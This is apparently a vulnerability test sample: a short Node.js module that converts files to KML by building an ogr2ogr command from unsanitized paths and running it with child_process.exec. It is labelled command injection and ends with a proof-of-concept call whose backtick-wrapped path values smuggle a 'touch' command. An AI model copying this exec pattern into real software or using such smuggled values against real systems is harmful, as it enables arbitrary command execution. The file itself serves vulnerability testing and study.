var exec = require('child_process').exec,
    path = require('path')

module.exports = function(inPath, outPath, done){
  var ogrCommand = 'ogr2ogr -f KML '+outPath+ ' '+inPath
  exec(ogrCommand, function(err, stdout, stderr){
    done(err)
  })
}
// Vuln: command-injection
var inPath = "success`";
var outPath = "`touch";
var done = (_) => { return () => {}; };;
module.exports(inPath, outPath, done);
